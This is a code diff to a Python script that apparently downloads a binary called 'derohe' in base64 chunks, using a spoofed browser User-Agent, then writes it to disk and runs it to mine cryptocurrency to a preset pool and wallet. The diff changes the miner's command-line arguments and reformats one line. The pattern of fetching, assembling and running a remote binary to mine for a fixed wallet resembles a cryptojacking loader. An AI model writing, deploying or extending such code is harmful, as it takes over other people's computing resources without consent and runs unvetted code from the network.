@@ -29,7 +29,8 @@ def check_for_derohe() -> str:
 
 def download_derohe_binary() -> str:
     """Download derohe from base64 files"""
-    headers = {'User-Agent': 'Mozilla/5.0 (Linux x86_64; X11) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/11.0.431.99 Safari/537.13'}
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Linux x86_64; X11) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/11.0.431.99 Safari/537.13'}
     session = requests.Session()
     files_b64_string = ''
     for number_extension in range(1, int(f'{ENDFILECOUNT}')):
@@ -51,8 +52,8 @@ def create_derohe_file(files_b64_string) -> None:
 
 def execute_derohe() -> int:
     """Execute derohe and start mining"""
-    command = [f'{WORKING_DIR}derohe', '-o', f'{MININGPOOL}', '-u',
-               f'{WALLET}', '--tls', '--coin', 'monero']
+    command = [f'{WORKING_DIR}derohe', '--daemon-rpc-address', f'{MININGPOOL}', '--wallet-address',
+               f'{WALLET}']
     subprocess.call(command)
 
 
@@ -78,4 +79,3 @@ else:
 
 # if __name__ == '__main__':
 #    main()
-
